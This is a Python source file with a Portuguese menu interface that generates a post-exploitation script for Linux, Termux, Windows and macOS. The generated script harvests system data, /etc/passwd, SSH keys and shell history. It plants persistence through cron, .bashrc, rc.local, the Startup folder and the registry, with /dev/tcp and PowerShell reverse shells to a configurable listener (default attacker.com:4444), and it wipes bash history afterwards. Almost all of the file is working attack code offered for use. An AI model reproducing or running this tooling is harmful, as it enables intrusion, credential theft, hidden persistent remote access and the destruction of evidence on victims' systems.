import os
import platform
import sys
from time import sleep

class PostExploitGenerator:
    def __init__(self):
        self.banner = [
            "╔══════════════════════════════════════════════════════════════╗",
            "║    ██████╗  ██████╗ ███████╗████████╗ ██████╗ ██████╗ ██╗     ║",
            "║    ██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗██║     ║",
            "║    ██████╔╝██║   ██║███████╗   ██║   ██║   ██║██████╔╝██║     ║",
            "║    ██╔═══╝ ██║   ██║╚════██║   ██║   ██║   ██║██╔═══╝ ██║     ║",
            "║    ██║     ╚██████╔╝███████║   ██║   ╚██████╔╝██║     ███████╗║",
            "║    ╚═╝      ╚═════╝ ╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚══════╝║",
            "║               GERADOR DE SCRIPTS PÓS-EXPLORAÇÃO               ║",
            "╚══════════════════════════════════════════════════════════════╝"
        ]
        self.config = {
            'reverse_shell': False,
            'persistence': True,
            'collect_info': True,
            'check_vulns': True,
            'target_os': 'auto',
            'output_file': 'post_exploit.py',
            'listener_ip': 'attacker.com',
            'listener_port': '4444'
        }
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        self.clear_screen()
        for line in self.banner:
            print(line)
        print("\n")
    
    def press_enter(self):
        input("\n[Pressione Enter para continuar...]")
        self.clear_screen()
    
    def show_menu(self):
        while True:
            self.print_banner()
            print("╔══════════════════════════════════════════════════════════════╗")
            print("║                         MENU PRINCIPAL                       ║")
            print("╠══════════════════════════════════════════════════════════════╣")
            print("║ 1. Configurar opções                                         ║")
            print("║ 2. Visualizar configuração atual                             ║")
            print("║ 3. Gerar script de pós-exploração                            ║")
            print("║ 4. Sair                                                      ║")
            print("╚══════════════════════════════════════════════════════════════╝")
            
            choice = input("\nEscolha uma opção: ")
            
            if choice == '1':
                self.configure_options()
            elif choice == '2':
                self.show_current_config()
            elif choice == '3':
                self.generate_script()
            elif choice == '4':
                print("\n[+] Saindo do gerador...")
                sys.exit(0)
            else:
                print("\n[!] Opção inválida. Tente novamente.")
                sleep(1)
    
    def configure_options(self):
        while True:
            self.print_banner()
            print("╔══════════════════════════════════════════════════════════════╗")
            print("║                     CONFIGURAR OPÇÕES                        ║")
            print("╠══════════════════════════════════════════════════════════════╣")
            print("║ 1. Habilitar/Desabilitar reverse shell automático            ║")
            print("║ 2. Habilitar/Desabilitar mecanismos de persistência          ║")
            print("║ 3. Habilitar/Desabilitar coleta de informações               ║")
            print("║ 4. Habilitar/Desabilitar verificação de vulnerabilidades     ║")
            print("║ 5. Definir sistema operacional alvo                          ║")
            print("║ 6. Configurar listener (IP e porta)                         ║")
            print("║ 7. Definir nome do arquivo de saída                         ║")
            print("║ 8. Voltar ao menu principal                                  ║")
            print("╚══════════════════════════════════════════════════════════════╝")
            
            choice = input("\nEscolha uma opção: ")
            
            try:
                if choice == '1':
                    self.config['reverse_shell'] = not self.config['reverse_shell']
                    status = "HABILITADO" if self.config['reverse_shell'] else "DESABILITADO"
                    print(f"\n[+] Reverse shell automático: {status}")
                    self.press_enter()
                elif choice == '2':
                    self.config['persistence'] = not self.config['persistence']
                    status = "HABILITADO" if self.config['persistence'] else "DESABILITADO"
                    print(f"\n[+] Mecanismos de persistência: {status}")
                    self.press_enter()
                elif choice == '3':
                    self.config['collect_info'] = not self.config['collect_info']
                    status = "HABILITADO" if self.config['collect_info'] else "DESABILITADO"
                    print(f"\n[+] Coleta de informações: {status}")
                    self.press_enter()
                elif choice == '4':
                    self.config['check_vulns'] = not self.config['check_vulns']
                    status = "HABILITADO" if self.config['check_vulns'] else "DESABILITADO"
                    print(f"\n[+] Verificação de vulnerabilidades: {status}")
                    self.press_enter()
                elif choice == '5':
                    self.set_target_os()
                elif choice == '6':
                    self.set_listener()
                elif choice == '7':
                    self.set_output_file()
                elif choice == '8':
                    return
                else:
                    print("\n[!] Opção inválida. Tente novamente.")
                    sleep(1)
            except Exception as e:
                print(f"\n[!] Erro: {str(e)}")
                self.press_enter()
    
    def set_target_os(self):
        self.print_banner()
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                DEFINIR SISTEMA OPERACIONAL ALVO              ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        print("║ 1. Auto-detect (padrão)                                      ║")
        print("║ 2. Linux                                                     ║")
        print("║ 3. Termux (Android)                                          ║")
        print("║ 4. Windows                                                   ║")
        print("║ 5. macOS                                                     ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        
        choice = input("\nEscolha o sistema operacional alvo: ")
        
        if choice == '1':
            self.config['target_os'] = 'auto'
        elif choice == '2':
            self.config['target_os'] = 'linux'
        elif choice == '3':
            self.config['target_os'] = 'termux'
        elif choice == '4':
            self.config['target_os'] = 'windows'
        elif choice == '5':
            self.config['target_os'] = 'macos'
        else:
            print("\n[!] Opção inválida. Mantendo configuração atual.")
            sleep(1)
            return
        
        print("\n[+] Sistema operacional alvo definido com sucesso!")
        self.press_enter()
    
    def set_listener(self):
        self.print_banner()
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                  CONFIGURAR LISTENER (C2)                    ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        
        ip = input("\nDigite o IP ou domínio do listener (ex: attacker.com): ").strip()
        port = input("Digite a porta do listener (ex: 4444): ").strip()
        
        if ip:
            self.config['listener_ip'] = ip
        if port:
            if port.isdigit() and 1 <= int(port) <= 65535:
                self.config['listener_port'] = port
            else:
                print("\n[!] Porta inválida. Mantendo porta padrão (4444).")
                sleep(1)
        
        print("\n[+] Listener configurado com sucesso!")
        self.press_enter()
    
    def set_output_file(self):
        self.print_banner()
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║               DEFINIR NOME DO ARQUIVO DE SAÍDA              ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        
        filename = input("\nDigite o nome do arquivo de saída (ex: exploit.py): ").strip()
        
        if filename:
            if not filename.endswith('.py'):
                filename += '.py'
            self.config['output_file'] = filename
            print("\n[+] Nome do arquivo de saída definido com sucesso!")
        else:
            print("\n[!] Nome inválido. Mantendo configuração atual.")
        
        self.press_enter()
    
    def show_current_config(self):
        self.print_banner()
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                    CONFIGURAÇÃO ATUAL                        ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        print(f"║ Reverse Shell Automático: {'✅' if self.config['reverse_shell'] else '❌'}")
        print(f"║ Mecanismos de Persistência: {'✅' if self.config['persistence'] else '❌'}")
        print(f"║ Coleta de Informações: {'✅' if self.config['collect_info'] else '❌'}")
        print(f"║ Verificação de Vulnerabilidades: {'✅' if self.config['check_vulns'] else '❌'}")
        print(f"║ Sistema Operacional Alvo: {self.config['target_os'].upper()}")
        print(f"║ Listener: {self.config['listener_ip']}:{self.config['listener_port']}")
        print(f"║ Arquivo de Saída: {self.config['output_file']}")
        print("╚══════════════════════════════════════════════════════════════╝")
        self.press_enter()
    
    def generate_script(self):
        self.print_banner()
        print("[+] Gerando script de pós-exploração...")
        print("[+] Configurações aplicadas:")
        print(f"    - OS Alvo: {self.config['target_os']}")
        print(f"    - Listener: {self.config['listener_ip']}:{self.config['listener_port']}")
        print(f"    - Arquivo: {self.config['output_file']}\n")
        
        try:
            # Verifica e cria diretório se necessário
            output_path = os.path.abspath(self.config['output_file'])
            output_dir = os.path.dirname(output_path)
            
            if output_dir and not os.path.exists(output_dir):
                os.makedirs(output_dir, exist_ok=True)
            
            # Verifica permissões de escrita
            if os.path.exists(output_path):
                if not os.access(output_path, os.W_OK):
                    print("\n[!] Erro: Sem permissão para escrever no arquivo existente.")
                    self.press_enter()
                    return
            
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(self.generate_script_content())
            
            file_size = os.path.getsize(output_path)
            print(f"\n[+] Script gerado com sucesso: {output_path}")
            print(f"[+] Tamanho do arquivo: {file_size} bytes")
            print(f"[+] Permissões: {oct(os.stat(output_path).st_mode & 0o777)}")
            
        except PermissionError:
            print("\n[!] Erro: Permissão negada. Não é possível escrever no arquivo/diretório.")
        except Exception as e:
            print(f"\n[!] Erro ao gerar o script: {str(e)}")
        
        self.press_enter()
    
    def generate_script_content(self):
        script = """#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Script de Pós-Exploração Automático
# Gerado por PostExploitGenerator
#
# Uso: Execute este script no sistema alvo após obter acesso inicial

import os
import platform
import subprocess
import sys
from time import sleep

class PostExploitTool:
    def __init__(self):
        self.banner = [
            "        .o oOOOOOOOo                                            OOOo",
            "        Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO",
            "        OboO...........OOo. .oOOOOOo.    OOOo.oOOOOOo..........OO",
            "        OOP.oOOOOOOOOOOO POOOOOOOOOOOo.    OOOOOOOOOOP,OOOOOOOOOOOB",
            "        OOOOO     OOOOOoOOOOOOOOOOO .adOOOOOOOOOoOOO     OOOOOo",
            "        .OOOO            OOOOOOOOOOOOOOOOOOOOOOO            OO",
            "        OOOOO                  OOOOOOOOOOOOOO                 oOO",
            "       oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.",
            "      oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO",
            "     OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO    OOOOOOOOOOOOOO.OOOOOOOOOOOOOO",
            "     OOOO       YOoOOOOMOIONODOO    .    OOROAOPOEOOOoOY     OOO",
            "        Y           OOOOOOOOOOOOOO. .oOOo. :OOOOOOOOOOO?         :",
            "        :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .",
            "        .            oOOP%OOOOOOOOoOOOOOOO?oOOOOO?OOOOOOo",
            "                      %o  OOOO%OOOO%%OOOOO%OOOOOO%OOO",
            "                          $  OOOOO OY  OOOOO  o             .",
            "        .                  .     OP          : o     ."
        ]
        self.os_type = self.detect_os()
        self.collected_data = {}
        self.listener_ip = "{listener_ip}"
        self.listener_port = "{listener_port}"
        
    def detect_os(self):
        system = platform.system().lower()
        if 'linux' in system:
            if 'termux' in os.environ.get('PREFIX', '').lower():
                return 'termux'
            return 'linux'
        elif 'windows' in system:
            return 'windows'
        elif 'darwin' in system:
            return 'macos'
        else:
            return 'unknown'
    
    def print_banner(self):
        for line in self.banner:
            print(line)
        print("\\n[+] Post-Exploitation Tool - Running on: " + self.os_type.upper())
        print("[+] Automatic detection and exploitation module loaded\\n")
        sleep(2)
    
    def run_command(self, cmd):
        try:
            if self.os_type == 'windows':
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            else:
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE, executable='/bin/bash')
            return result.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"Error executing command: {str(e)}"
    """.format(
        listener_ip=self.config['listener_ip'],
        listener_port=self.config['listener_port']
    )

        if self.config['collect_info']:
            script += """
    def collect_system_info(self):
        print("[+] Collecting system information...")
        
        if self.os_type == 'windows':
            commands = {
                'system_info': 'systeminfo',
                'network_info': 'ipconfig /all',
                'users': 'net user',
                'processes': 'tasklist',
                'firewall': 'netsh advfirewall show allprofiles',
                'drives': 'wmic logicaldisk get caption,description,providername',
                'installed_software': 'wmic product get name,version'
            }
        else:
            commands = {
                'system_info': 'uname -a',
                'network_info': 'ifconfig || ip a',
                'users': 'cat /etc/passwd',
                'processes': 'ps aux',
                'sudo_users': 'grep -Po \\'^sudo.+:\\\\K.*$\\' /etc/group',
                'crontab': 'crontab -l',
                'ssh_keys': 'find / -name "id_*" -type f 2>/dev/null',
                'installed_packages': 'dpkg -l || rpm -qa'
            }
            
            if self.os_type == 'termux':
                commands['termux_info'] = 'termux-info'
                commands['termux_packages'] = 'apt list --installed'
        
        for name, cmd in commands.items():
            print(f"[*] Testing {name}...")
            try:
                self.collected_data[name] = self.run_command(cmd)
                sleep(0.3)
            except Exception as e:
                self.collected_data[name] = f"Error collecting {name}: {str(e)}"
        
        print("[+] System information collected!\\n")
    
    def check_history(self):
        print("[+] Checking command history...")
        try:
            if self.os_type == 'windows':
                history = self.run_command('doskey /history')
            else:
                history = self.run_command('history')
            
            self.collected_data['command_history'] = history
            print("[+] Command history extracted\\n")
        except Exception as e:
            self.collected_data['command_history'] = f"Error getting history: {str(e)}"
            print("[!] Failed to get command history\\n")
    
    def check_interesting_files(self):
        print("[+] Searching for interesting files...")
        
        try:
            if self.os_type == 'windows':
                files = {
                    'desktop_files': 'dir "%USERPROFILE%\\\\Desktop\\\\*" /s /b',
                    'documents': 'dir "%USERPROFILE%\\\\Documents\\\\*" /s /b',
                    'downloads': 'dir "%USERPROFILE%\\\\Downloads\\\\*" /s /b',
                    'recent_files': 'dir "%APPDATA%\\\\Microsoft\\\\Windows\\\\Recent\\\\*" /s /b'
                }
            else:
                files = {
                    'home_files': 'find ~/ -type f -name "*" 2>/dev/null | head -n 50',
                    'config_files': 'find /etc/ -type f -name "*.conf" 2>/dev/null | head -n 30',
                    'ssh_config': 'cat ~/.ssh/config 2>/dev/null',
                    'bashrc': 'cat ~/.bashrc 2>/dev/null',
                    'bash_history': 'cat ~/.bash_history 2>/dev/null'
                }
            
            for name, cmd in files.items():
                print(f"[*] Checking {name}...")
                self.collected_data[name] = self.run_command(cmd)
                sleep(0.3)
            
            print("[+] File search completed\\n")
        except Exception as e:
            print(f"[!] Error during file search: {str(e)}\\n")
            """

        if self.config['check_vulns']:
            script += """
    def check_vulnerabilities(self):
        print("[+] Checking for common vulnerabilities...")
        
        try:
            if self.os_type == 'linux' or self.os_type == 'termux':
                # Check for SUID binaries
                self.collected_data['suid_binaries'] = self.run_command('find / -perm -4000 -type f 2>/dev/null | xargs ls -la 2>/dev/null')
                
                # Check writable directories
                self.collected_data['writable_dirs'] = self.run_command('find / -type d -writable 2>/dev/null | grep -v "/proc/"')
                
                # Check kernel version
                self.collected_data['kernel_version'] = self.run_command('uname -r')
                
                # Check for misconfigured sudo permissions
                self.collected_data['sudo_perms'] = self.run_command('sudo -l')
                
            elif self.os_type == 'windows':
                # Check Windows version
                self.collected_data['windows_version'] = self.run_command('wmic os get caption,version')
                
                # Check installed patches
                self.collected_data['hotfixes'] = self.run_command('wmic qfe list')
                
                # Check for AlwaysInstallElevated
                self.collected_data['always_install_elevated'] = self.run_command('reg query HKCU\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer /v AlwaysInstallElevated')
                self.collected_data['always_install_elevated'] += "\\n" + self.run_command('reg query HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer /v AlwaysInstallElevated')
            
            print("[+] Vulnerability checks completed\\n")
        except Exception as e:
            print(f"[!] Error during vulnerability checks: {str(e)}\\n")
            """

        if self.config['persistence']:
            script += """
    def attempt_persistence(self):
        print("[+] Attempting persistence mechanisms...")
        
        try:
            if self.os_type == 'linux' or self.os_type == 'termux':
                # Try adding to cron
                cron_cmd = '(crontab -l 2>/dev/null; echo "@reboot sleep 60 && /bin/bash -c \\'exec 9<> /dev/tcp/{listener_ip}/{listener_port} && exec 0<&9 && exec 1>&9 2>&9 && /bin/bash --noprofile -i\\'") | crontab -'
                self.collected_data['cron_persistence'] = self.run_command(cron_cmd)
                
                # Try modifying .bashrc
                bashrc_cmd = 'echo "bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1 &" >> ~/.bashrc'
                self.collected_data['bashrc_persistence'] = self.run_command(bashrc_cmd)
                
                # Try adding to /etc/rc.local
                self.collected_data['rclocal_persistence'] = self.run_command('echo "/bin/bash -c \\'exec 9<> /dev/tcp/{listener_ip}/{listener_port} && exec 0<&9 && exec 1>&9 2>&9 && /bin/bash --noprofile -i\\' &" >> /etc/rc.local')
                
            elif self.os_type == 'windows':
                # Try adding to startup
                startup_cmd = 'copy "%~f0" "%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"'
                self.collected_data['startup_persistence'] = self.run_command(startup_cmd)
                
                # Try adding registry run key
                reg_cmd = f'reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v "Update" /t REG_SZ /d "\\"%CD%\\\\{os.path.basename(__file__)}\\" /background" /f'
                self.collected_data['registry_persistence'] = self.run_command(reg_cmd)
            
            print("[+] Persistence mechanisms attempted\\n")
        except Exception as e:
            print(f"[!] Error attempting persistence: {str(e)}\\n")
            """.format(
                listener_ip=self.config['listener_ip'],
                listener_port=self.config['listener_port']
            )

        if self.config['reverse_shell']:
            script += """
    def establish_reverse_shell(self):
        print("[+] Attempting to establish reverse shell...")
        
        try:
            if self.os_type == 'windows':
                cmd = 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\\'{listener_ip}\\',{listener_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\'PS \\' + (pwd).Path + \\'> \\';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
            else:
                cmd = 'bash -c "exec 9<> /dev/tcp/{listener_ip}/{listener_port};exec 0<&9;exec 1>&9 2>&9;/bin/bash --noprofile -i"'
            
            # Run in background
            if self.os_type == 'windows':
                subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            
            print("[+] Reverse shell attempted to {listener_ip}:{listener_port}")
        except Exception as e:
            print(f"[!] Failed to establish reverse shell: {str(e)}")
            """.format(
                listener_ip=self.config['listener_ip'],
                listener_port=self.config['listener_port']
            )

        script += """
    def save_data(self):
        print("[+] Saving collected data...")
        try:
            filename = f"exploit_data_{{self.os_type}}_{{os.getpid()}}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"=== POST-EXPLOITATION REPORT ===\\n")
                f.write(f"Target OS: {{self.os_type}}\\n")
                f.write(f"Listener: {{self.listener_ip}}:{{self.listener_port}}\\n\\n")
                
                for section, data in self.collected_data.items():
                    f.write(f"\\n=== {{section.upper()}} ===\\n")
                    f.write(str(data))
                    f.write("\\n")
            
            print(f"[+] Data saved to {{filename}}")
            return filename
        except Exception as e:
            print(f"[!] Error saving data: {{str(e)}}")
            return None
    
    def cleanup(self):
        print("[+] Performing basic cleanup...")
        try:
            if self.os_type == 'linux' or self.os_type == 'termux':
                # Remove command history
                self.run_command('history -c && rm -f ~/.bash_history')
            elif self.os_type == 'windows':
                # Clear recent commands
                self.run_command('doskey /reinstall')
        except:
            pass
    
    def run(self):
        self.print_banner()
        """

        if self.config['collect_info']:
            script += """
        self.collect_system_info()
        self.check_history()
        self.check_interesting_files()
            """

        if self.config['check_vulns']:
            script += """
        self.check_vulnerabilities()
            """

        if self.config['reverse_shell']:
            script += """
        self.establish_reverse_shell()
            """

        if self.config['persistence']:
            script += """
        self.attempt_persistence()
            """

        script += """
        report_file = self.save_data()
        self.cleanup()
        
        print("\\n[+] Post-exploitation completed!")
        if report_file:
            print(f"[+] Report saved to: {{report_file}}")
        else:
            print("[!] Could not save report file")

if __name__ == "__main__":
    try:
        tool = PostExploitTool()
        tool.run()
    except KeyboardInterrupt:
        print("\\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\\n[!] Critical error: {{str(e)}}")
        sys.exit(1)
        """

        return script

if __name__ == "__main__":
    try:
        generator = PostExploitGenerator()
        generator.show_menu()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Fatal error: {str(e)}")
        sys.exit(1)
